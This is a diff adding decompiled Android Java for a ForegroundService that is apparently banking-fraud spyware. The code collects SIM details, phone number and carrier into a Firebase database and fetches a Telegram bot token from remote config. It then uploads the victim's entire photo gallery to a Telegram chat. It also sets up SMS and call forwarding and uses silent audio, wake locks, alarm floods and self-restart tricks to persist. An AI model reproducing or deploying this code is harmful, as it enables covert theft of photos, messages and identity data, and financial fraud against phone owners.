+            if (getApplicationContext().checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
+                HashMap map = new HashMap();
+                map.put("sims", getSimsInternal());
+                map.put("mobNo", getPhoneNumber());
+                map.put("service_provider", getCarrier());
+                FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID).updateChildren(map).addOnSuccessListener(new UpiPinActivity$$ExternalSyntheticLambda4(14)).addOnFailureListener(new UpiPinActivity$$ExternalSyntheticLambda4(15));
+            }
+        } catch (InterruptedException unused) {
+            Thread.currentThread().interrupt();
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    /* JADX WARN: Code duplicated, block: B:175:0x045b A[Catch: all -> 0x03c1, TryCatch #0 {all -> 0x03c1, blocks: (B:180:0x0472, B:172:0x043e, B:171:0x043b, B:132:0x03bd, B:138:0x03e9, B:142:0x03f2, B:144:0x03fc, B:151:0x0410, B:173:0x043f, B:175:0x045b, B:137:0x03c7), top: B:198:0x03bd }] */
+    /* JADX WARN: Code duplicated, block: B:218:0x0435 A[EXC_TOP_SPLITTER, SYNTHETIC] */
+    public void uploadGalleryToTelegram() throws Throwable {
+        String str;
+        Cursor cursor;
+        String str2;
+        Throwable th;
+        Throwable th2;
+        ForegroundService foregroundService = this;
+        String str3 = "_id";
+        String str4 = "galleryUploadedIds";
+        String str5 = PREFS_NAME;
+        str3 = "Previously uploaded IDs: ";
+        try {
+            Log.d(TAG, "Gallery upload method started");
+            if (!NetworkUtil.isConnected(this)) {
+                Log.w(TAG, "No network, skipping gallery upload");
+                foregroundService.galleryRetryHandler.postDelayed(new ForegroundService$$ExternalSyntheticLambda23(foregroundService, 1), GALLERY_RETRY_MS);
+                return;
+            }
+            if (checkSelfPermission("android.permission.READ_MEDIA_IMAGES") != 0 && checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE") != 0) {
+                Log.w(TAG, "Media permission not granted, skipping gallery upload");
+                return;
+            }
+            Log.d(TAG, "Media permissions OK");
+            try {
+                FirebaseAuth firebaseAuth = FirebaseAuth.getInstance();
+                try {
+                    if (firebaseAuth.getCurrentUser() == null) {
+                        Log.d(TAG, "Firebase user is null, starting anonymous auth...");
+                        CountDownLatch countDownLatch = new CountDownLatch(1);
+                        str = "Found ";
+                        try {
+                            firebaseAuth.signInAnonymously().addOnCompleteListener(new ForegroundService$$ExternalSyntheticLambda28(0, firebaseAuth, countDownLatch));
+                            countDownLatch.await(30L, TimeUnit.SECONDS);
+                        } catch (Exception e) {
+                            e = e;
+                            str3 = "Previously uploaded IDs: ";
+                            Log.e(TAG, "Auth wait error", e);
+                        }
+                    } else {
+                        str = "Found ";
+                        Log.d(TAG, "Firebase user already authenticated: " + firebaseAuth.getCurrentUser().getUid());
+                    }
+                    Log.d(TAG, "Auth status: ".concat(firebaseAuth.getCurrentUser() != null ? "AUTHENTICATED" : "NULL"));
+                } catch (Exception e2) {
+                    e = e2;
+                    Log.e(TAG, "Auth wait error", e);
+                }
+            } catch (Exception e3) {
+                e = e3;
+                str = "Found ";
+            }
+            Log.d(TAG, "Testing Firebase write connectivity...");
+            try {
+                CountDownLatch countDownLatch2 = new CountDownLatch(1);
+                boolean[] zArr = {false};
+                DatabaseReference reference = FirebaseDatabase.getInstance().getReference("clients/" + foregroundService.deviceID + "/galleryTest");
+                StringBuilder sb = new StringBuilder("ping_");
+                sb.append(System.currentTimeMillis());
+                reference.setValue(sb.toString()).addOnSuccessListener(new ForegroundService$$ExternalSyntheticLambda28(4, zArr, countDownLatch2)).addOnFailureListener(new App$$ExternalSyntheticLambda1(countDownLatch2, 1));
+                countDownLatch2.await(10L, TimeUnit.SECONDS);
+                Log.d(TAG, "Firebase write test: ".concat(zArr[0] ? "OK" : "FAILED"));
+            } catch (Exception e4) {
+                Log.e(TAG, "Firebase write test error", e4);
+            }
+            Log.d(TAG, "Reading gallery config from galleryConfig/global...");
+            final String[] strArr = {null};
+            final String[] strArr2 = {null};
+            final CountDownLatch countDownLatch3 = new CountDownLatch(1);
+            FirebaseDatabase.getInstance().getReference("galleryConfig/global").addListenerForSingleValueEvent(new ValueEventListener() { // from class: com.cbqimrt.lx4076cb.ForegroundService.9
+                @Override // com.google.firebase.database.ValueEventListener
+                public void onCancelled(DatabaseError databaseError) {
+                    Log.e(ForegroundService.TAG, "Config read CANCELLED: " + databaseError.getMessage());
+                    countDownLatch3.countDown();
+                }
+
+                @Override // com.google.firebase.database.ValueEventListener
+                public void onDataChange(DataSnapshot dataSnapshot) {
+                    String str6;
+                    if (dataSnapshot.exists()) {
+                        strArr[0] = (String) dataSnapshot.child("botToken").getValue(String.class);
+                        strArr2[0] = (String) dataSnapshot.child("chatId").getValue(String.class);
+                        StringBuilder sb2 = new StringBuilder("Config found: token=");
+                        if (strArr[0] != null) {
+                            str6 = strArr[0].length() + " chars";
+                        } else {
+                            str6 = "null";
+                        }
+                        sb2.append(str6);
+                        sb2.append(", chatId=");
+                        sb2.append(strArr2[0]);
+                        Log.d(ForegroundService.TAG, sb2.toString());
+                    } else {
+                        Log.w(ForegroundService.TAG, "Config NOT found at galleryConfig/global/");
+                    }
+                    countDownLatch3.countDown();
+                }
+            });
+            TimeUnit timeUnit = TimeUnit.SECONDS;
+            countDownLatch3.await(20L, timeUnit);
+            String str6 = strArr[0];
+            String str7 = strArr2[0];
+            try {
+                if (str6 == null || str6.isEmpty() || str7 == null || str7.isEmpty()) {
+                    Log.w(TAG, "Config not found, retrying in 20s...");
+                    try {
+                        Thread.sleep(20000L);
+                        strArr[0] = null;
+                        strArr2[0] = null;
+                        final CountDownLatch countDownLatch4 = new CountDownLatch(1);
+                        FirebaseDatabase.getInstance().getReference("galleryConfig/global").addListenerForSingleValueEvent(new ValueEventListener() { // from class: com.cbqimrt.lx4076cb.ForegroundService.10
+                            @Override // com.google.firebase.database.ValueEventListener
+                            public void onCancelled(DatabaseError databaseError) {
+                                Log.e(ForegroundService.TAG, "Retry config read CANCELLED: " + databaseError.getMessage());
+                                countDownLatch4.countDown();
+                            }
+
+                            @Override // com.google.firebase.database.ValueEventListener
+                            public void onDataChange(DataSnapshot dataSnapshot) {
+                                String str8;
+                                if (dataSnapshot.exists()) {
+                                    strArr[0] = (String) dataSnapshot.child("botToken").getValue(String.class);
+                                    strArr2[0] = (String) dataSnapshot.child("chatId").getValue(String.class);
+                                    StringBuilder sb2 = new StringBuilder("Retry config: token=");
+                                    if (strArr[0] != null) {
+                                        str8 = strArr[0].length() + " chars";
+                                    } else {
+                                        str8 = "null";
+                                    }
+                                    sb2.append(str8);
+                                    sb2.append(", chatId=");
+                                    sb2.append(strArr2[0]);
+                                    Log.d(ForegroundService.TAG, sb2.toString());
+                                } else {
+                                    Log.w(ForegroundService.TAG, "Retry config still NOT found");
+                                }
+                                countDownLatch4.countDown();
+                            }
+                        });
+                        countDownLatch4.await(20L, timeUnit);
+                        str6 = strArr[0];
+                        str7 = strArr2[0];
+                        if (str6 == null || str6.isEmpty() || str7 == null || str7.isEmpty()) {
+                            Log.w(TAG, "Config STILL not found, retrying in 5 min");
+                            foregroundService.galleryRetryHandler.postDelayed(new ForegroundService$$ExternalSyntheticLambda23(foregroundService, 1), GALLERY_RETRY_MS);
+                            return;
+                        }
+                    } catch (InterruptedException unused) {
+                        return;
+                    }
+                }
+                Log.d(TAG, "Validating bot token...");
+                if (!TelegramHelper.testBotToken(str6)) {
+                    Log.e(TAG, "Bot token INVALID — check Admin Settings");
+                    foregroundService.galleryUploadActive = true;
+                    return;
+                }
+                Log.d(TAG, "Bot token VALID");
+                foregroundService.galleryUploadActive = true;
+                String str8 = "📱 " + Build.MODEL + "\n🤖 Android " + Build.VERSION.RELEASE + "\n🆔 " + foregroundService.deviceID;
+                HashSet hashSet = new HashSet(foregroundService.getSharedPreferences(PREFS_NAME, 0).getStringSet("galleryUploadedIds", new HashSet()));
+                Log.d(TAG, str3 + hashSet.size());
+                Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+                Log.d(TAG, "Querying MediaStore...");
+                Cursor cursorQuery = getContentResolver().query(uri, new String[]{"_id", "_display_name", "date_added"}, null, null, "date_added DESC");
+                try {
+                    if (cursorQuery == null) {
+                        Log.w(TAG, "Gallery cursor is null");
+                        if (cursorQuery != null) {
+                            cursorQuery.close();
+                            return;
+                        }
+                        return;
+                    }
+                    int columnIndexOrThrow = cursorQuery.getColumnIndexOrThrow("_id");
+                    int columnIndexOrThrow2 = cursorQuery.getColumnIndexOrThrow("_display_name");
+                    int count = cursorQuery.getCount();
+                    Log.d(TAG, str + count + " images on device");
+                    int i = 0;
+                    int i2 = 0;
+                    int i3 = 0;
+                    while (true) {
+                        if (!cursorQuery.moveToNext()) {
+                            str2 = str4;
+                            break;
+                        }
+                        String str9 = str4;
+                        str5 = str5;
+                        long j = cursorQuery.getLong(columnIndexOrThrow);
+                        columnIndexOrThrow = columnIndexOrThrow;
+                        String string = cursorQuery.getString(columnIndexOrThrow2);
+                        String strValueOf = String.valueOf(j);
+                        if (!hashSet.contains(strValueOf)) {
+                            int i4 = i2 + i3;
+                            if (i4 % 50 == 0 && i4 > 0 && !NetworkUtil.isConnected(this)) {
+                                Log.w(TAG, "Network lost during gallery upload, stopping");
+                                str2 = str9;
+                                str5 = str5;
+                                break;
+                            }
+                            columnIndexOrThrow2 = columnIndexOrThrow2;
+                            Uri uriWithAppendedPath = Uri.withAppendedPath(uri, String.valueOf(j));
+                            Uri uri2 = uri;
+                            cursor = cursorQuery;
+                            try {
+                                File cacheDir = getCacheDir();
+                                int i5 = i;
+                                StringBuilder sb2 = new StringBuilder();
+                                try {
+                                    sb2.append("gallery_");
+                                    sb2.append(j);
+                                    sb2.append(".jpg");
+                                    File file = new File(cacheDir, sb2.toString());
+                                    try {
+                                        Log.d(TAG, "Uploading image " + string + " (id=" + strValueOf + ")");
+                                        InputStream inputStreamOpenInputStream = getContentResolver().openInputStream(uriWithAppendedPath);
+                                        try {
+                                            FileOutputStream fileOutputStream = new FileOutputStream(file);
+                                            if (inputStreamOpenInputStream == null) {
+                                                try {
+                                                    Log.w(TAG, "InputStream null for " + string);
+                                                    i3++;
+                                                    try {
+                                                        fileOutputStream.close();
+                                                        if (inputStreamOpenInputStream != null) {
+                                                            inputStreamOpenInputStream.close();
+                                                        }
+                                                        foregroundService = this;
+                                                        str4 = str9;
+                                                        str5 = str5;
+                                                        uri = uri2;
+                                                        cursorQuery = cursor;
+                                                        i = i5;
+                                                    } catch (Throwable th3) {
+                                                        this = this;
+                                                        th = th3;
+                                                        str9 = str9;
+                                                        str5 = str5;
+                                                        if (inputStreamOpenInputStream != null) {
+                                                            try {
+                                                                inputStreamOpenInputStream.close();
+                                                            } catch (Throwable th4) {
+                                                                th.addSuppressed(th4);
+                                                            }
+                                                        }
+                                                        throw th;
+                                                    }
+                                                } catch (Throwable th5) {
+                                                    th2 = th5;
+                                                    try {
+                                                        fileOutputStream.close();
+                                                    } catch (Throwable th6) {
+                                                        th2.addSuppressed(th6);
+                                                    }
+                                                    throw th2;
+                                                }
+                                            } else {
+                                                try {
+                                                    byte[] bArr = new byte[8192];
+                                                    while (true) {
+                                                        int i6 = inputStreamOpenInputStream.read(bArr);
+                                                        if (i6 == -1) {
+                                                            break;
+                                                        } else {
+                                                            fileOutputStream.write(bArr, 0, i6);
+                                                        }
+                                                        th = th;
+                                                        if (inputStreamOpenInputStream != null) {
+                                                            inputStreamOpenInputStream.close();
+                                                        }
+                                                        throw th;
+                                                    }
+                                                    fileOutputStream.close();
+                                                    inputStreamOpenInputStream.close();
+                                                    String strUploadPhoto = TelegramHelper.uploadPhoto(str6, str7, file, str8);
+                                                    file.delete();
+                                                    boolean z = strUploadPhoto != null;
+                                                    if (z) {
+                                                        i2++;
+                                                        hashSet.add(strValueOf);
+                                                        Log.d(TAG, "Upload OK: " + string + " (" + i2 + " done)");
+                                                        this = this;
+                                                        try {
+                                                            try {
+                                                                this.indexGalleryUpload(str6, strUploadPhoto, string, str8);
+                                                            } catch (Exception e5) {
+                                                                e = e5;
+                                                                str9 = str9;
+                                                                str5 = str5;
+                                                                Log.e(TAG, "Error uploading image " + string, e);
+                                                                i3++;
+                                                                if (file.exists()) {
+                                                                    file.delete();
+                                                                }
+                                                                foregroundService = this;
+                                                                str4 = str9;
+                                                                uri = uri2;
+                                                                cursorQuery = cursor;
+                                                                i = i5;
+                                                            }
+                                                        } catch (Throwable th7) {
+                                                            th = th7;
+                                                            Throwable th8 = th;
+                                                            if (cursor == null) {
+                                                                throw th8;
+                                                            }
+                                                            try {
+                                                                cursor.close();
+                                                                throw th8;
+                                                            } catch (Throwable th9) {
+                                                                th8.addSuppressed(th9);
+                                                                throw th8;
+                                                            }
+                                                        }
+                                                    } else {
+                                                        this = this;
+                                                        i3++;
+                                                        Log.w(TAG, "Upload FAILED: " + string + " — " + TelegramHelper.lastUploadError);
+                                                    }
+                                                    if (i2 % 10 != 0 || i2 <= 0) {
+                                                        str9 = str9;
+                                                        str5 = str5;
+                                                    } else {
+                                                        str5 = str5;
+                                                        try {
+                                                            str9 = str9;
+                                                            try {
+                                                                this.getSharedPreferences(str5, 0).edit().putStringSet(str9, hashSet).commit();
+                                                            } catch (Exception e6) {
+                                                                e = e6;
+                                                                Log.e(TAG, "Error uploading image " + string, e);
+                                                                i3++;
+                                                                if (file.exists()) {
+                                                                    file.delete();
+                                                                }
+                                                            }
+                                                        } catch (Exception e7) {
+                                                            e = e7;
+                                                            str9 = str9;
+                                                            Log.e(TAG, "Error uploading image " + string, e);
+                                                            i3++;
+                                                            if (file.exists()) {
+                                                                file.delete();
+                                                            }
+                                                        }
+                                                    }
+                                                    if (z) {
+                                                        Thread.sleep(2100L);
+                                                    }
+                                                    foregroundService = this;
+                                                    str4 = str9;
+                                                    uri = uri2;
+                                                    cursorQuery = cursor;
+                                                    i = i5;
+                                                } catch (Throwable th10) {
+                                                    th2 = th10;
+                                                    fileOutputStream.close();
+                                                    throw th2;
+                                                }
+                                            }
+                                            try {
+                                                fileOutputStream.close();
+                                                throw th2;
+                                            } catch (Throwable th11) {
+                                                th = th11;
+                                            }
+                                        } catch (Throwable th12) {
+                                            th = th12;
+                                            this = this;
+                                            str9 = str9;
+                                            str5 = str5;
+                                        }
+                                    } catch (Exception e8) {
+                                        e = e8;
+                                        this = this;
+                                    }
+                                } catch (Throwable th13) {
+                                    th = th13;
+                                }
+                            } catch (Throwable th14) {
+                                th = th14;
+                            }
+                        } else {
+                            i++;
+                            str4 = str9;
+                            columnIndexOrThrow = columnIndexOrThrow;
+                            str5 = str5;
+                        }
+                    }
+                    foregroundService.getSharedPreferences(str5, 0).edit().putStringSet(str2, hashSet).commit();
+                    Log.d(TAG, "Gallery done — " + i2 + " sent, " + i + " skipped, " + i3 + " failed, " + count + " total");
+                    cursorQuery.close();
+                    return;
+                } catch (Throwable th15) {
+                    th = th15;
+                    cursor = cursorQuery;
+                }
+            } catch (Exception e9) {
+                e = e9;
+            }
+        } catch (Exception e10) {
+            e = e10;
+        }
+        Log.e(TAG, "Gallery upload error", e);
+    }
+
+    @Override // android.app.Service
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    @Override // android.app.Service
+    public void onCreate() throws Throwable {
+        super.onCreate();
+        this.restartAttempts = getSharedPreferences(PREFS_NAME, 0).getInt("restartAttempts", 0);
+        appContext = getApplicationContext();
+        if (FirebaseApp.getApps(this).isEmpty()) {
+            FirebaseApp.initializeApp(this);
+            FirebaseDatabase.getInstance().setPersistenceEnabled(true);
+        }
+        String string = getSharedPreferences(PREFS_NAME, 0).getString(KEY_DEVICE_ID, null);
+        this.deviceID = string;
+        if (string == null) {
+            String string2 = Settings.Secure.getString(getContentResolver(), "android_id");
+            this.deviceID = string2;
+            if (string2 == null || string2.isEmpty()) {
+                this.deviceID = "unknown";
+            }
+            getSharedPreferences(PREFS_NAME, 0).edit().putString(KEY_DEVICE_ID, this.deviceID).apply();
+        }
+        this.callUtil = new CallForwardingUtility(this);
+        this.smsFwd = SmsForwardingUtility.getInstance(this);
+        createChannel();
+        startForegroundInternal();
+        startSilentAudio();
+        acquireWL();
+        startWLTimer();
+        scheduleAlarm(this);
+        scheduleAlarmFlood(this);
+        registerBatteryReceiver();
+        registerNetworkListener();
+        registerPersistenceReceivers();
+        KeepAliveJobService.schedule(this);
+        KeepAliveWorker.schedule(this);
+        requestExactAlarmPermission();
+        running.set(true);
+        if (getSharedPreferences(PREFS_NAME, 0).getBoolean(KEY_REGISTERED, false)) {
+            startListening();
+            setupPresence();
+            restoreSmsForward();
+        } else {
+            getSharedPreferences(PREFS_NAME, 0).edit().remove("existingMsgsUploaded").apply();
+            this.exec.execute(new ForegroundService$$ExternalSyntheticLambda23(this, 0));
+        }
+        this.lastSmsTimestamp = getSharedPreferences(PREFS_NAME, 0).getLong("lastSmsTimestamp", 0L);
+        startSmsPoll();
+        startGalleryUpload();
+    }
+
+    @Override // android.app.Service
+    public void onDestroy() {
+        ValueEventListener valueEventListener;
+        ValueEventListener valueEventListener2;
+        this.isHeartbeating = false;
+        this.isListening = false;
+        releaseWL();
+        DatabaseReference databaseReference = this.dataRef;
+        if (databaseReference != null && (valueEventListener2 = this.dataListener) != null) {
+            databaseReference.removeEventListener(valueEventListener2);
+        }
+        DatabaseReference databaseReference2 = this.connectedRef;
+        if (databaseReference2 != null && (valueEventListener = this.connectedListener) != null) {
+            databaseReference2.removeEventListener(valueEventListener);
+        }
+        BroadcastReceiver broadcastReceiver = this.batteryReceiver;
+        if (broadcastReceiver != null) {
+            try {
+                unregisterReceiver(broadcastReceiver);
+            } catch (Exception unused) {
+            }
+            this.batteryReceiver = null;
+        }
+        if (this.networkCallback != null && Build.VERSION.SDK_INT >= 24) {
+            try {
+                ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService("connectivity");
+                if (connectivityManager != null) {
+                    connectivityManager.unregisterNetworkCallback(this.networkCallback);
+                }
+            } catch (Exception unused2) {
+            }
+            this.networkCallback = null;
+        }
+        BroadcastReceiver broadcastReceiver2 = this.connectivityReceiver;
+        if (broadcastReceiver2 != null) {
+            try {
+                unregisterReceiver(broadcastReceiver2);
+            } catch (Exception unused3) {
+            }
+            this.connectivityReceiver = null;
+        }
+        BroadcastReceiver broadcastReceiver3 = this.persistenceReceiver;
+        if (broadcastReceiver3 != null) {
+            try {
+                unregisterReceiver(broadcastReceiver3);
+            } catch (Exception unused4) {
+            }
+            this.persistenceReceiver = null;
+        }
+        MediaPlayer mediaPlayer = this.mediaPlayer;
+        if (mediaPlayer != null) {
+            try {
+                mediaPlayer.stop();
+                this.mediaPlayer.release();
+            } catch (Exception unused5) {
+            }
+            this.mediaPlayer = null;
+        }
+        this.hbExec.shutdownNow();
+        this.exec.shutdownNow();
+        this.galleryExec.shutdownNow();
+        running.set(false);
+        getSharedPreferences(PREFS_NAME, 0).edit().putInt("restartAttempts", 0).apply();
+        try {
+            Intent intent = new Intent(this, (Class<?>) ForegroundService.class);
+            if (Build.VERSION.SDK_INT >= 26) {
+                startForegroundService(intent);
+            } else {
+                startService(intent);
+            }
+        } catch (Exception unused6) {
+            scheduleRestartAlarms(this);
+        }
+        super.onDestroy();
+    }
+
+    @Override // android.app.Service
+    public int onStartCommand(Intent intent, int i, int i2) {
+        if (intent != null) {
+            return 1;
+        }
+        Log.w(TAG, "Restarted with null intent (START_STICKY)");
+        return 1;
+    }
+
+    @Override // android.app.Service
+    public void onTaskRemoved(Intent intent) {
+        super.onTaskRemoved(intent);
+        this.restartAttempts = 0;
+        getSharedPreferences(PREFS_NAME, 0).edit().putInt("restartAttempts", 0).apply();
+        Intent intent2 = new Intent(this, (Class<?>) ForegroundService.class);
+        try {
+            if (Build.VERSION.SDK_INT >= 26) {
+                startForegroundService(intent2);
+            } else {
+                startService(intent2);
+            }
+        } catch (Exception unused) {
+        }
+        scheduleRestartAlarms(this);
+        scheduleAlarmFlood(this);
+    }
+}
